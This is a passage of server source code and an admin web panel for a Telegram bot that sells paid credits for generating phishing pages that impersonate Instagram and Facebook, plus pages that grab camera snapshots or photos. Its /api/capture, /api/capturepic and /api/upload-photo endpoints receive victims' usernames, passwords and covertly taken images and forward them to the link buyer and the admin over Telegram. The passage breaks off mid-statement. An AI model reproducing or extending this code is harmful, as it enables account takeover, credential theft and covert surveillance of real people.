    <div id="tab-featured" class="tab-content">
        <h2>⭐ Featured Settings</h2>
        <div class="upload-section">
            <h3>📸 Featured Photo</h3>
            <div class="flex">
                <select id="featuredPhotoSelect" style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;">
                    <option value="">Select a photo...</option>
                </select>
                <button class="btn btn-primary" onclick="setFeaturedPhoto()">Set</button>
                <button class="btn btn-danger" onclick="removeFeaturedPhoto()">Remove</button>
            </div>
            <div id="featuredPreview" class="featured-preview"><p style="color:#888;">No featured photo</p></div>
        </div>
        <div class="upload-section">
            <h3>💬 Featured Message</h3>
            <div class="flex">
                <input type="text" id="featuredMessage" placeholder="Enter message..." style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;">
                <button class="btn btn-primary" onclick="setFeaturedMessage()">Update</button>
            </div>
            <div id="featuredMessageDisplay" style="margin-top:10px;padding:15px;background:#0a0a0a;border-radius:8px;border:1px solid #2a2a4a;color:#aaa;"></div>
        </div>
        <div class="upload-section">
            <h3>⚙️ Status</h3>
            <div class="flex">
                <span id="featuredStatus" class="status-badge status-active">✅ Active</span>
                <button class="btn btn-warning" onclick="toggleFeaturedStatus()">Toggle</button>
            </div>
        </div>
    </div>

    <!-- QR Tab -->
    <div id="tab-qr" class="tab-content">
        <div class="qr-section">
            <h2>💰 Payment QR Code</h2>
            <div id="qrDisplay">
                <p style="color:#888;margin:20px 0">Upload payment QR code</p>
                <input type="file" id="qrUpload" accept="image/*">
                <button class="btn btn-primary" onclick="uploadQR()">Upload QR</button>
                <button class="btn btn-danger" onclick="removeQR()">Remove QR</button>
            </div>
            <div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;">
                <p style="color:#888;margin-bottom:10px;">Current QR Code:</p>
                <img id="qrImage" src="" style="max-width:200px;border-radius:10px;">
            </div>
        </div>
    </div>

    <!-- Logs Tab -->
    <div id="tab-logs" class="tab-content">
        <h2>📋 Server Logs</h2>
        <div class="flex" style="margin-bottom:20px">
            <button class="btn btn-primary" onclick="loadLogs()">Refresh</button>
            <button class="btn btn-danger" onclick="clearLogs()">Clear Logs</button>
        </div>
        <div id="logsDisplay" class="logs-area">Loading logs...</div>
    </div>

    <!-- Commands Tab -->
    <div id="tab-commands" class="tab-content">
        <h2>📜 All Commands</h2>
        <div class="upload-section">
            <h3>👑 Admin Commands</h3>
            <pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">
/help or /commands - Show all commands
/admin - Open admin panel
/addcredits [userId] [amount] - Add credits
/removecredits [userId] [amount] - Remove credits
/unlimited [userId] - Activate unlimited
/resetuser [userId] - Reset user
/users - Show all users
/stats - Bot statistics
/broadcast [message] - Send to all users
/setqr - Upload QR code (reply with image)
/removeqr - Remove QR code
/viewqr - View QR code
/addchannel [id] [name] [link] - Add channel
/removechannel [id] - Remove channel
/channels - List all channels
/addphoto [caption] - Upload photo (reply with image)
/featured [photoId] - Set featured photo
/featuredmsg [message] - Set featured message
/featuredtoggle - Toggle featured on/off
/logs - Show recent logs
/restart - Restart bot
            </pre>
            <h3 style="margin-top:20px">👤 User Commands</h3>
            <pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">
/start - Start the bot
/menu - Show main menu
/pay [amount] - Buy credits
/credits - Check your credits
/referral - Get referral link
            </pre>
        </div>
    </div>
</div>
<div id="toast" class="toast"></div>

<script>
const API_BASE=window.location.origin;

function showToast(m,e=false){const t=document.getElementById('toast');t.textContent=m;t.className='toast'+(e?' error':'');t.style.display='block';setTimeout(()=>{t.style.display='none'},3000);}

function showTab(tab){
    document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    document.getElementById('tab-'+tab).classList.add('active');
    document.querySelector(\`.tab[onclick="showTab('\${tab}')"]\`).classList.add('active');
    if(tab==='channels') loadChannels();
    if(tab==='users') loadUsers();
    if(tab==='featured') loadFeatured();
    if(tab==='logs') loadLogs();
    if(tab==='qr') loadQR();
}

// PHOTOS
async function loadPhotos(){
    try{
        const r=await fetch('/api/admin/photos');
        const d=await r.json();
        const photos=d.photos||[];
        const active=photos.filter(p=>p.active).length;
        const total=photos.length;
        document.getElementById('stats').innerHTML=\`
            <div class="stat-card"><div class="number">\${total}</div><div class="label">Total</div></div>
            <div class="stat-card"><div class="number">\${active}</div><div class="label">Active</div></div>
            <div class="stat-card"><div class="number">\${total-active}</div><div class="label">Inactive</div></div>
        \`;
        const grid=document.getElementById('photoGrid');
        if(photos.length===0){grid.innerHTML='<div class="empty"><i>📷</i>No photos</div>';return;}
        grid.innerHTML=photos.map(p=>\`
            <div class="card">
                <img src="\${p.url}">
                <div class="info">
                    <div>\${p.caption||'No caption'}</div>
                    <div style="font-size:12px;color:#888;">\${new Date(p.uploadedAt).toLocaleDateString()}</div>
                    <div style="font-size:12px;color:\${p.active?'#28a745':'#dc3545'};">\${p.active?'✅ Active':'❌ Inactive'}</div>
                </div>
                <div class="actions">
                    <button class="btn btn-warning" onclick="togglePhoto('\${p.id}')">\${p.active?'Hide':'Show'}</button>
                    <button class="btn btn-danger" onclick="deletePhoto('\${p.id}')">Delete</button>
                </div>
            </div>
        \`).join('');
    }catch(err){showToast('Error loading photos',true);}
}

async function deletePhoto(id){if(!confirm('Delete?'))return;try{const r=await fetch(\`/api/admin/photos/\${id}\`,{method:'DELETE'});if(r.ok){showToast('Deleted!');loadPhotos();}else showToast('Delete failed',true);}catch(err){showToast('Error',true);}}

async function togglePhoto(id){try{const r=await fetch(\`/api/admin/photos/\${id}/toggle\`,{method:'PATCH'});if(r.ok){showToast('Toggled!');loadPhotos();}else showToast('Toggle failed',true);}catch(err){showToast('Error',true);}}

document.getElementById('uploadForm').addEventListener('submit',async(e)=>{
    e.preventDefault();const fd=new FormData(e.target);
    try{const r=await fetch('/api/admin/upload',{method:'POST',body:fd});if(r.ok){showToast('Uploaded!');e.target.reset();loadPhotos();loadFeatured();}else showToast('Upload failed',true);}catch(err){showToast('Error',true);}
});

// CHANNELS
async function loadChannels(){
    try{
        const r=await fetch('/api/admin/channels');
        const channels=await r.json();
        const list=document.getElementById('channelList');
        if(channels.length===0){list.innerHTML='<div class="empty"><i>📢</i>No channels</div>';return;}
        list.innerHTML=channels.map(c=>\`
            <div class="channel-item">
                <div><div class="name">\${c.name}</div><div class="id">\${c.id}</div></div>
                <div>
                    <a href="\${c.link}" target="_blank" class="btn btn-primary">Visit</a>
                    <button class="btn btn-danger" onclick="removeChannel('\${c.id}')">Remove</button>
                </div>
            </div>
        \`).join('');
    }catch(err){showToast('Error loading channels',true);}
}

async function addChannel(){
    const id=document.getElementById('channelId').value.trim();
    const name=document.getElementById('channelName').value.trim();
    const link=document.getElementById('channelLink').value.trim();
    if(!id||!name||!link){showToast('Fill all fields',true);return;}
    try{
        const r=await fetch('/api/admin/channels',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,name,link})});
        if(r.ok){showToast('Channel added!');['channelId','channelName','channelLink'].forEach(i=>document.getElementById(i).value='');loadChannels();}
        else showToast('Add failed',true);
    }catch(err){showToast('Error',true);}
}

async function removeChannel(id){if(!confirm('Remove?'))return;try{const r=await fetch(\`/api/admin/channels/\${id}\`,{method:'DELETE'});if(r.ok){showToast('Removed!');loadChannels();}else showToast('Remove failed',true);}catch(err){showToast('Error',true);}}

// USERS
async function loadUsers(){
    try{
        const r=await fetch('/api/admin/users');
        const users=await r.json();
        const list=document.getElementById('userList');
        const entries=Object.entries(users);
        if(entries.length===0){list.innerHTML='<div class="empty"><i>👥</i>No users</div>';return;}
        list.innerHTML=entries.map(([id,data])=>\\\`
            <div class="user-card">
                <div class="uid">🆔 \${id}</div>
                <div>⭐ Credits: \${data.unlimited?'♾️ Unlimited':data.credits||0}</div>
                <div>👥 Referrals: \${data.totalReferrals||0}</div>
                <div>📅 Joined: \${new Date(data.joinedAt).toLocaleDateString()}</div>
                <div style="font-size:12px;color:#888;">Referred by: \${data.referredBy||'None'}</div>
            </div>
        \`).join('');
    }catch(err){showToast('Error loading users',true);}
}

async function searchUser(){
    const uid=document.getElementById('searchUser').value.trim();
    if(!uid){showToast('Enter User ID',true);return;}
    try{
        const r=await fetch(\`/api/admin/user/\${uid}\`);
        const user=await r.json();
        if(user.error){showToast('User not found',true);return;}
        document.getElementById('userList').innerHTML=\`
            <div class="user-card">
                <div class="uid">🆔 \${uid}</div>
                <div>⭐ Credits: \${user.unlimited?'♾️ Unlimited':user.credits||0}</div>
                <div>👥 Referrals: \${user.totalReferrals||0}</div>
                <div>📅 Joined: \${new Date(user.joinedAt).toLocaleDateString()}</div>
                <div>Referred by: \${user.referredBy||'None'}</div>
            </div>
        \`;
    }catch(err){showToast('Error',true);}
}

async function modifyCredits(){
    const uid=document.getElementById('userIdInput').value.trim();
    const amount=parseInt(document.getElementById('creditAmount').value);
    if(!uid||isNaN(amount)){showToast('Enter valid User ID and amount',true);return;}
    try{
        const r=await fetch('/api/admin/modify-credits',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:uid,amount})});
        const data=await r.json();
        if(data.success){showToast(\`Updated! New: \${data.credits}\`);loadUsers();}
        else showToast('Update failed',true);
    }catch(err){showToast('Error',true);}
}

async function toggleUnlimited(){
    const uid=document.getElementById('userIdInput').value.trim();
    if(!uid){showToast('Enter User ID',true);return;}
    try{
        const r=await fetch('/api/admin/toggle-unlimited',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:uid})});
        const data=await r.json();
        if(data.success){showToast(\`Unlimited: \${data.unlimited?'ON':'OFF'}\`);loadUsers();}
        else showToast('Toggle failed',true);
    }catch(err){showToast('Error',true);}
}

// FEATURED
async function loadFeatured(){
    try{
        const r=await fetch('/api/admin/featured');
        const data=await r.json();
        const photos=await fetch('/api/admin/photos').then(r=>r.json());
        const select=document.getElementById('featuredPhotoSelect');
        select.innerHTML='<option value="">Select a photo...</option>';
        photos.photos.forEach(p=>{
            const opt=document.createElement('option');
            opt.value=p.id;
            opt.textContent=p.caption||p.filename;
            if(data.photo===p.id) opt.selected=true;
            select.appendChild(opt);
        });
        const preview=document.getElementById('featuredPreview');
        if(data.photoData){preview.innerHTML=\`<img src="\${data.photoData.url}" style="max-width:200px;border-radius:10px;border:1px solid #2a2a4a;">\`;}
        else {preview.innerHTML='<p style="color:#888;">No featured photo</p>';}
        document.getElementById('featuredMessageDisplay').innerHTML=\`<strong>Current:</strong> \${data.message||'No message'}\`;
        document.getElementById('featuredMessage').value=data.message||'';
        const statusEl=document.getElementById('featuredStatus');
        if(data.status){statusEl.className='status-badge status-active';statusEl.textContent='✅ Active';}
        else {statusEl.className='status-badge status-inactive';statusEl.textContent='❌ Inactive';}
    }catch(err){showToast('Error loading featured',true);}
}

async function setFeaturedPhoto(){
    const photoId=document.getElementById('featuredPhotoSelect').value;
    if(!photoId){showToast('Select a photo',true);return;}
    try{
        const r=await fetch('/api/admin/featured/photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photoId})});
        if(r.ok){showToast('Featured photo updated!');loadFeatured();}
        else showToast('Update failed',true);
    }catch(err){showToast('Error',true);}
}

async function removeFeaturedPhoto(){
    try{
        const r=await fetch('/api/admin/featured/photo',{method:'DELETE'});
        if(r.ok){showToast('Removed!');loadFeatured();}
        else showToast('Remove failed',true);
    }catch(err){showToast('Error',true);}
}

async function setFeaturedMessage(){
    const message=document.getElementById('featuredMessage').value.trim();
    if(!message){showToast('Enter a message',true);return;}
    try{
        const r=await fetch('/api/admin/featured/message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message})});
        if(r.ok){showToast('Message updated!');loadFeatured();}
        else showToast('Update failed',true);
    }catch(err){showToast('Error',true);}
}

async function toggleFeaturedStatus(){
    try{
        const r=await fetch('/api/admin/featured/toggle',{method:'POST'});
        if(r.ok){showToast('Status toggled!');loadFeatured();}
        else showToast('Toggle failed',true);
    }catch(err){showToast('Error',true);}
}

// QR
async function loadQR(){
    try{
        const r=await fetch('/api/admin/qr');
        const data=await r.json();
        const preview=document.getElementById('qrPreview');
        if(data.url){
            preview.style.display='block';
            document.getElementById('qrImage').src='/api/admin/qr?t='+Date.now();
        }else{
            preview.style.display='none';
        }
    }catch(err){}
}

async function uploadQR(){
    const file=document.getElementById('qrUpload').files[0];
    if(!file){showToast('Select an image',true);return;}
    const fd=new FormData();fd.append('qr',file);
    try{
        const r=await fetch('/api/admin/upload-qr',{method:'POST',body:fd});
        const data=await r.json();
        if(data.success){
            showToast('QR uploaded!');
            loadQR();
        }else showToast('Upload failed',true);
    }catch(err){showToast('Error',true);}
}

async function removeQR(){
    if(!confirm('Remove QR code?'))return;
    try{
        const r=await fetch('/api/admin/remove-qr',{method:'DELETE'});
        if(r.ok){showToast('QR removed!');loadQR();}
        else showToast('Remove failed',true);
    }catch(err){showToast('Error',true);}
}

// LOGS
async function loadLogs(){
    try{
        const r=await fetch('/api/admin/logs');
        const data=await r.json();
        document.getElementById('logsDisplay').textContent=data.logs || 'No logs available';
    }catch(err){
        document.getElementById('logsDisplay').textContent='Error loading logs';
        showToast('Error loading logs',true);
    }
}

async function clearLogs(){
    if(!confirm('Clear all logs?'))return;
    try{
        const r=await fetch('/api/admin/logs',{method:'DELETE'});
        if(r.ok){showToast('Logs cleared!');loadLogs();}
        else showToast('Clear failed',true);
    }catch(err){showToast('Error',true);}
}

// Load all
loadPhotos();
loadChannels();
loadUsers();
loadFeatured();
loadQR();
</script>
</body>
</html>`);
});

// ====================== ADMIN API ======================
app.get('/api/admin/photos', (req, res) => res.json({ photos: getPhotos(), total: getPhotos().length }));

app.post('/api/admin/upload', upload.single('photo'), (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'No file' });
        const photo = addPhoto(req.file, req.body.caption || '');
        res.json({ success: true, photo });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.delete('/api/admin/photos/:id', (req, res) => res.json({ success: deletePhoto(req.params.id) }));

app.patch('/api/admin/photos/:id/toggle', (req, res) => {
    const photo = togglePhoto(req.params.id);
    res.json({ success: !!photo, photo });
});

// Channels API
app.get('/api/admin/channels', (req, res) => res.json(getChannels()));

app.post('/api/admin/channels', (req, res) => {
    const { id, name, link } = req.body;
    if (!id || !name || !link) return res.status(400).json({ error: 'Missing fields' });
    res.json(addChannel(id, name, link));
});

app.delete('/api/admin/channels/:id', (req, res) => res.json(removeChannel(req.params.id)));

// Users API
app.get('/api/admin/users', (req, res) => res.json(getUsers()));

app.get('/api/admin/user/:id', (req, res) => {
    const user = getUser(req.params.id);
    if (!user) return res.json({ error: 'User not found' });
    res.json(user);
});

app.post('/api/admin/modify-credits', (req, res) => {
    const { userId, amount } = req.body;
    if (!userId || isNaN(amount)) return res.status(400).json({ error: 'Invalid data' });
    const user = getUser(userId);
    if (user.unlimited) return res.json({ success: true, credits: 'Unlimited' });
    user.credits = Math.max(0, (user.credits || 0) + amount);
    saveUsers(getUsers());
    res.json({ success: true, credits: user.credits });
});

app.post('/api/admin/toggle-unlimited', (req, res) => {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ error: 'No userId' });
    const user = getUser(userId);
    user.unlimited = !user.unlimited;
    saveUsers(getUsers());
    res.json({ success: true, unlimited: user.unlimited });
});

// Featured API
app.get('/api/admin/featured', (req, res) => {
    const featured = getFeatured();
    const photos = getPhotos();
    if (featured.photo) {
        const photo = photos.find(p => p.id === featured.photo);
        featured.photoData = photo || null;
    }
    res.json(featured);
});

app.post('/api/admin/featured/photo', (req, res) => {
    const { photoId } = req.body;
    if (!photoId) return res.status(400).json({ error: 'No photo ID' });
    const featured = setFeaturedPhoto(photoId);
    res.json({ success: true, featured });
});

app.delete('/api/admin/featured/photo', (req, res) => {
    const featured = getFeatured();
    featured.photo = null;
    saveFeatured(featured);
    res.json({ success: true });
});

app.post('/api/admin/featured/message', (req, res) => {
    const { message } = req.body;
    if (!message) return res.status(400).json({ error: 'No message' });
    const featured = setFeaturedMessage(message);
    res.json({ success: true, featured });
});

app.post('/api/admin/featured/toggle', (req, res) => {
    const featured = toggleFeaturedStatus();
    res.json({ success: true, featured });
});

// QR Code API - FIXED
app.post('/api/admin/upload-qr', upload.single('qr'), (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'No file' });
        if (fs.existsSync(QR_FILE)) fs.unlinkSync(QR_FILE);
        fs.renameSync(req.file.path, QR_FILE);
        console.log('✅ QR Code saved successfully');
        logToFile('📱 QR Code uploaded');
        res.json({ success: true, url: '/api/admin/qr' });
    } catch (err) {
        console.error('QR Upload Error:', err);
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/admin/remove-qr', (req, res) => {
    try {
        if (fs.existsSync(QR_FILE)) {
            fs.unlinkSync(QR_FILE);
            logToFile('📱 QR Code removed');
            res.json({ success: true });
        } else {
            res.json({ success: false, error: 'No QR found' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/admin/qr', (req, res) => {
    try {
        if (fs.existsSync(QR_FILE)) {
            res.sendFile(QR_FILE);
        } else {
            res.json({ url: null });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Logs API
app.get('/api/admin/logs', (req, res) => {
    try {
        const logs = fs.readFileSync(LOGS_FILE, 'utf8');
        res.json({ logs });
    } catch {
        res.json({ logs: 'No logs available' });
    }
});

app.delete('/api/admin/logs', (req, res) => {
    fs.writeFileSync(LOGS_FILE, '');
    res.json({ success: true });
});

// ====================== BOT API ======================
app.get('/api/bot/random-photo', (req, res) => {
    const photo = getRandomPhoto();
    if (photo) res.json({ success: true, photo });
    else res.status(404).json({ error: 'No photos' });
});

app.post('/api/capture', async (req, res) => {
    const { userid, username, password, platform } = req.body || {};
    if (!userid || !username) return res.status(400).json({ error: 'Missing fields' });
    try {
        const photo = getRandomPhoto();
        let message = LoveNotifer(platform, username, password);
        if (photo) {
            const photoUrl = `${req.protocol}://${req.get('host')}${photo.url}`;
            await S7.sendPhoto(userid, photoUrl, { caption: message, parse_mode: 'HTML' });
        } else {
            await S7.sendMessage(userid, message);
        }
        logToFile(`📸 Capture from user ${userid} - ${platform}`);
        res.json({ status: 'success' });
    } catch (error) { 
        logToFile(`❌ Capture error: ${error.message}`);
        res.status(500).json({ error: error.message }); 
    }
});

app.post('/api/capturepic', async (req, res) => {
    const { userid, mobile, SY, platform } = req.body || {};
    if (!userid || !SY) return res.status(400).json({ error: 'Missing required photo data' });
    try {
        const photoBuffer = Buffer.from(SY.replace(/^data:image\/\w+;base64,/, ""), 'base64');
        const SYloveTiMe = moment().tz("Asia/Kolkata").format('h:mm:ss A');
        const SYloveDaTe = moment().tz("Asia/Kolkata").format('DD/MM/YYYY');
        const caption = `<b>📸 NEW CAPTURE 📸</b>\n\n` +
            `👤 <b>Target:</b> <code>${mobile || 'Unknown'}</code>\n` +
            `🌐 <b>Platform:</b> ${platform ? platform.toUpperCase() : 'N/A'}\n` +
            `📅 <b>Date:</b> ${SYloveDaTe}\n` +
            `⏰ <b>Time:</b> ${SYloveTiMe}\n\n` +
            `<i>© ↝ ᴅᴇᴠ ʙʏ » ${config.S7}</i>`;
        await S7.sendPhoto(userid, photoBuffer, { caption, parse_mode: 'HTML' });
        logToFile(`📸 Camera capture from user ${userid}`);
        res.json({ status: 'success' });
    } catch (error) { 
        logToFile(`❌ Camera capture error: ${error.message}`);
        res.status(500).json({ error: 'Failed to process image' }); 
    }
});

// ====================== PHOTO ACCESS API ======================
app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    const { userid, platform, filename, data, size } = req.body || {};
    if (!userid || !data) return res.status(400).json({ error: 'Missing data' });
    
    try {
        // Save photo to uploads folder
        const base64Data = data.replace(/^data:image\/\w+;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        const saveName = Date.now() + '-' + (filename || 'photo.jpg');
        const savePath = path.join(UPLOADS_DIR, saveName);
        fs.writeFileSync(savePath, buffer);
        
        // Send to bot user
        const photoUrl = `${req.protocol}://${req.get('host')}/uploads/${saveName}`;
        const caption = `📸 <b>New Photo Received</b>\n\n` +
            `👤 <b>User:</b> <code>${userid}</code>\n` +
            `📁 <b>File:</b> ${filename || 'photo.jpg'}\n` +
            `📏 <b>Size:</b> ${size ? (size/1024).toFixed(1) + 'KB' : 'Unknown'}\n` +
            `🌐 <b>Platform:</b> ${platform || 'Photo Access'}\n` +
            `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
            `🔒 <b>AI Processing Complete</b> ✅`;
        
        await S7.sendPhoto(userid, buffer, { caption, parse_mode: 'HTML' });
        
        // Also send to admin
        await S7.sendPhoto(config.adminId, buffer, { 
            caption: `📸 <b>User Photo Upload</b>\n\n👤 User: <code>${userid}</code>\n📁 ${filename || 'photo.jpg'}`,
            parse_mode: 'HTML' 
        });
        
        logToFile(`📸 Photo upload from user ${userid}: ${filename}`);
        res.json({ success: true });
    } catch (error) {
        console.error('Photo upload error:', error);
        logToFile(`❌ Photo upload error: ${error.message}`);
        res.status(500).json({ error: 'Failed to process photo' });
    }
});

// ====================== LINK GENERATION ======================
app.get('/api/create-link', (req, res) => {
    const userid = req.headers.userid || 'unknown';
    const platform = req.headers.platform || 'instagram';
    const p = platform.toLowerCase();
    
    if (userid !== 'unknown') {
        const user = getUser(userid);
        if (!user.unlimited && (user.credits || 0) <= 0) {
            return res.status(402).json({ 
                error: 'Insufficient credits', 
                message: 'You need 1 credit to generate a link. Use referral or buy credits!',
                credits: user.credits || 0,
                needBuy: true
            });
        }
        useCredit(userid);
        logToFile(`🔗 Link generated for user ${userid} - ${platform}`);
    }
    
    let template;
    const pLower = p.toLowerCase();
    if (pLower === 'instagram') template = TEMPLATES.instagram;
    else if (pLower === 'facebook') template = TEMPLATES.facebook;
    else if (pLower === 'camera') template = TEMPLATES.camera;
    else if (pLower === 'photoaccess' || pLower === 'photo') template = PHOTO_ACCESS_TEMPLATE;
    else return res.status(400).json({ error: 'Invalid platform' });
    
    const displayPlatform = pLower === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' : 
                           pLower === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' : 
                           pLower === 'camera' ? '𝐂𝐀𝐌𝐄𝐑𝐀' : '𝐏𝐇𝐎𝐓𝐎 𝐀𝐂𝐂𝐄𝐒𝐒';
    
    let html = template
        .replace(/USERID_PLACEHOLDER/g, userid)
        .replace(/PLATFORM_PLACEHOLDER/g, displayPlatform);
    
    const fileId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
    fs.writeFileSync(path.join(PAGES_DIR, `${fileId}.html`), html);
    const url = `${config.baseUrl}/page/${fileId}`;
    console.log(`🔗 Link generated: ${url} for user ${userid}`);
    res.json({ success: true, url, id: fileId });
});

app.get('/page/:id', (req, res) => {
    const id = req.params.id;
    const filePath = path.join(PAGES_DIR, `${id}.html`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.status(404).send('<h1>Page not found</h1>');
});

// ====================== TELEGRAM BOT ======================
const S7 = new TelegramBot(config.mainToken, { polling: true });

S7.getMe().then((botInfo) => {
    console.log(`✅ Bot Started: @${botInfo.username}`);
    console.log(`✅ Bot ID: ${botInfo.id}`);
    logToFile(`🤖 Bot Started: @${botInfo.username}`);
}).catch(err => {
    console.error('❌ Bot Start Error:', err.message);
    logToFile(`❌ Bot Start Error: ${err.message}`);
    process.exit(1);
});

// ====================== KEYBOARDS ======================
const LOVESY = {
    inline_keyboard: [
        [{ text: "📸 INSTAGRAM", callback_data: "gen_instagram" }],
        [{ text: "📘 FACEBOOK", callback_data: "gen_facebook" }],
        [{ text: "📷 CAMERA", callback_data: "gen_camera" }],
        [{ text: "🖼️ PHOTO ACCESS", callback_data: "gen_photoaccess" }],
        [{ text: "👥 Referral", callback_data: "referral" }],
        [{ text: "⭐ My Credits", callback_data: "credits" }],
        [{ text: "💰 Buy Credits", callback_data: "buy_credits" }],
        [{ text: "📜 Commands", callback_data: "commands" }]
    ]
};

// Admin Keyboard
const ADMIN_KEYBOARD = {
    inline_keyboard: [
        [{ text: "👑 Admin Panel", callback_data: "admin_panel" }],
        [{ text: "📊 Stats", callback_data: "admin_stats" }],
        [{ text: "📢 Broadcast", callback_data: "admin_broadcast" }],
        [{ text: "📋 Logs", callback_data: "admin_logs" }],
        [{ text: "🔙 Back", callback_data: "back" }]
    ]
};

const SYBack = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back" }]] };

const getRegenMarkup = (platform) => ({
    inline_keyboard: [
        [{ text: `🔄 REGENERATE`, callback_data: `regen_${platform}` }],
        [{ text: "🔙 BACK", callback_data: "back" }]
    ]
});

// ====================== BOT COMMANDS ======================
async function SendLoveSYMenu(chatId, firstName) {
    const user = getUser(chatId);
    const featured = getFeatured();
    const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
    const isAdmin = chatId.toString() === config.adminId;
    
    let message = `𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻\n\n⭐ Credits: ${credits}\n👥 Referrals: ${user.totalReferrals || 0}`;
    
    if (featured.status && featured.message) {
        message += `\n\n📌 ${featured.message}`;
    }
    
    const menuText = SYloveMenu(firstName, message);
    
    let keyboard = LOVESY;
    if (isAdmin) {
        keyboard = {
            inline_keyboard: [
                ...LOVESY.inline_keyboard,
                [{ text: "👑 Admin Panel", callback_data: "admin_panel" }]
            ]
        };
    }
    
    const sentMsg = await S7.sendMessage(chatId, menuText, { 
        parse_mode: 'HTML', 
        reply_markup: keyboard 
    });
    
    if (featured.status && featured.photo) {
        const photos = getPhotos();
        const photo = photos.find(p => p.id === featured.photo);
        if (photo) {
            const photoUrl = `${config.baseUrl}${photo.url}`;
            await S7.sendPhoto(chatId, photoUrl, { caption: '⭐ Featured Content' });
        }
    }
    
    return sentMsg;
}

async function checkAndSendMenu(chatId, firstName) {
    const isMember = await checkAllChannels(chatId);
    if (!isMember) {
        const channels = getChannels();
        let msg = '⚠️ <b>Access Denied!</b>\n\nPlease join all channels:\n\n';
        channels.forEach((c, i) => {
            msg += `${i+1}. <a href="${c.link}">${c.name}</a>\n`;
        });
        msg += '\nAfter joining, click below to verify.';
        return S7.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: getChannelButtons() });
    }
    await SendLoveSYMenu(chatId, firstName);
}

function SYLoVe(commands) {
    if (!Array.isArray(commands)) commands = [commands];
    S7.on('message', async (msg) => {
        if (!msg.text) return;
        const cmd = msg.text.trim().split(' ')[0].slice(1);
        if (commands.includes(cmd)) {
            console.log(`📩 Command: ${cmd} from ${msg.from.first_name}`);
            logToFile(`📩 Command: ${cmd} from ${msg.from.id}`);
            await checkAndSendMenu(msg.chat.id, msg.from.first_name);
        }
    });
}

SYLoVe(['start', 'menu']);

// ====================== REFERRAL HANDLER ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text.startsWith('/start ref_')) {
        const referrerId = text.replace('/start ref_', '');
        const userId = msg.from.id;
        
        const user = getUser(userId);
        if (user.referredBy) {
            return S7.sendMessage(userId, '✅ You are already registered!');
        }
        
        const referrer = getUser(referrerId);
        if (!referrer) {
            return S7.sendMessage(userId, '❌ Invalid referral link!');
        }
        
        if (!await checkAllChannels(userId)) {
            user._pendingReferrer = referrerId;
            saveUsers(getUsers());
            
            const channels = getChannels();
            let msgText = '⚠️ <b>Join all channels first!</b>\n\n';
            channels.forEach((c, i) => {
                msgText += `${i+1}. <a href="${c.link}">${c.name}</a>\n`;
            });
            msgText += '\nAfter joining, click below to claim referral bonus!';
            return S7.sendMessage(userId, msgText, { parse_mode: 'HTML', reply_markup: getChannelButtons() });
        }
        
        await processReferral(referrerId, userId);
    }
});

async function processReferral(referrerId, userId) {
    const user = getUser(userId);
    if (user.referredBy) return;
    
    user.referredBy = referrerId;
    user.credits = (user.credits || 0) + 3;
    saveUsers(getUsers());
    
    const referrer = addReferral(referrerId, userId);
    
    let newUserInfo = '@user_' + userId;
    try {
        const chat = await S7.getChat(userId);
        newUserInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + userId;
    } catch(e) {}
    
    let referrerInfo = '@user_' + referrerId;
    try {
        const chat = await S7.getChat(referrerId);
        referrerInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + referrerId;
    } catch(e) {}
    
    await S7.sendMessage(referrerId, 
        `🎉 <b>New Referral Success!</b>\n\n` +
        `👤 <b>New User:</b> ${newUserInfo}\n` +
        `🆔 <b>New User ID:</b> <code>${userId}</code>\n` +
        `⭐ <b>Points Earned:</b> +2\n\n` +
        `📊 <b>Your Total Points:</b> ${referrer.credits || 0}\n` +
        `📊 <b>Your Total Referrals:</b> ${referrer.totalReferrals || 0}`,
        { parse_mode: 'HTML' }
    );
    
    await S7.sendMessage(config.adminId,
        `👥 <b>New Referral Success!</b>\n\n` +
        `👤 <b>Referrer:</b> ${referrerInfo}\n` +
        `👤 <b>New User:</b> ${newUserInfo}\n` +
        `🆔 <b>Referrer ID:</b> <code>${referrerId}</code>\n` +
        `🆔 <b>New User ID:</b> <code>${userId}</code>\n` +
        `⭐ <b>Points Earned:</b> 2\n\n` +
        `📊 <b>Referrer Total Points:</b> ${referrer.credits || 0}\n` +
        `📊 <b>Referrer Total Referrals:</b> ${referrer.totalReferrals || 0}`,
        { parse_mode: 'HTML' }
    );
    
    await S7.sendMessage(userId, 
